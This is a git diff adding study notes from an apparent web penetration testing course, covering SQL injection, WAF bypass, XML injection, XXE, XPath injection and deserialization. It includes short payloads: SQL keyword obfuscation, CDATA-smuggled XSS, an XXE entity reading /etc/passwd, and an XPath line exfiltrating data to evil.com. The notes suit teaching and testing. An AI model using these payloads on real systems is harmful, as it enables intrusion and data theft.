@@ -113,9 +113,86 @@ If no such auth mechanism is present the text before authority is ignored.
 * CSP 
 * UI Redressing - x-Jacking Art, ClickJacking, LikeJacking, StrokeJacking,   
 
-
 ## Module 7
 
 ### SQL Injection
+* Inband, Blind Exploitation
+* Boolean and Time based
+* OOB (Out Of Band) Exploitation
+* Payloads, Comments, SQL Dialect
+* Database Users and Privilages
+* Oracle URL-HTTP Package
+* DNS Exfiltration
+* Provoking DNS requests
+* First and Second order 
 
 
+## Module 8
+
+### SQLi Filter Evasion and WAF bypass
+* Obfuscate keywords
+	- Before MySQL 4.1 --> SELECT can be manipulated as `S/**/EL/**/ECT` or `sEleCt` etc
+	- Regular Notationa 
+		--> N'literal' eg. SELECT N'mystring' 
+		--> B'literal' for Bit Literals
+	- Unicode  
+	- Escaping eg. SELECT `'He\'llo'` or `He\%\_llo`  or `'He''llo'` or `"He""llo"` or `'\H\e\l\l\o'` etc
+	- Concatenation 
+		--> SELECT `'He'+'ll'+'o'`
+		--> SELECT CONCAT('He','ll','o')
+		--> SELECT CONCAT_WS('','He','ll','o') 
+		--> C-Style notation `SELECT 'He'/**/'ll'/**/'o'` or `SELECT /**//**/'He'/**/'ll'/**/'o'`
+
+* Bypassing Keyword Filters
+	- URL and Double URL encoding
+	- AND and OR operators can be replaced by && and || (only in MySQL and MSSQl)
+	- Use union eg. `UNION(SELECT 'VALUES') && ..` , `/*!00000 UNION*//*!00000 SELECT*/ ..`
+	  
+
+## Module 9
+
+### XML Attacks
+	- Attacks --> XML Injection, XML External Entities, XML Entities Expansion, and XPATH Injection.
+	- DTD (Document Typs Definition) --> Legal buildings blocks of an XML document.
+
+### XML Injection
+	- XML Tag Injection --> Tags ', ", &, >
+	- Using CDATA eg. `<tagname><!-- --><![CDATA[value]]>`
+	- XSS via CDATA 
+		--> `<![CDATA[<]]>script<![CDATA[>]]>alert('XSS')<![CDATA[<]]>/script<![CDATA[>]]>` translates to `<script>alert('XSS')</script>`
+
+### XML eXternal Entity
+	- Resource inclusion 
+		--> `<!ENTITY xxefile SYSTEM "file:///etc/passwd">`
+	- Resource inclusion Advanced -- When fetching reosuces it is posssible that the file contains special chars will cause parsing error and file will not be fetched. Also it possible that document entities specifiaction provies parameter entities. 
+		--> Using `php://filter` and use base64 for encoding.
+	- Bypass Access Control -- Let's say php file configuration has access restriction to local server so it will show "ACCESS DENIED"
+	- OOB Data Retrieval -- Exploitation is successful but no output is shown to the user, so we need to setup a server that validates the injection.
+
+### XML Entity Expansion
+	- Recursive Entity Expansion -- The goal of XEE is Denial Of Service attack. eg. Billion Laughs Attack
+	- Generic Entity Expansion -- DoS attack eg. Quadractic Blowup Attack
+	- Remote Entity Expansion
+
+### XPATH Injection
+	- XPATH is like SQL for querying XML database.
+	- Upper-case and lower-case are useful for detection purpose of XPATH version (1.0 [negative output] or 2.0 [positive output])
+	- Blind Explotation
+		--> Error based - Generate error by sending an incorrectly formatted XPath query.
+		--> Boolean based
+		--> OOB eg. `doc(concat("http://evil.com/oob/", RESULT_WE_WANT))`, similar to `doc(concat("http://evil.com/oob/", /Employees/Employee[1]/username))`
+		
+
+
+## Module 10
+
+### Attacking Serialization
+	- Serialize and Deserialize
+	- DeserLab
+
+
+
+## Module 11
+
+### Server Side 
+	- Reverse proxy
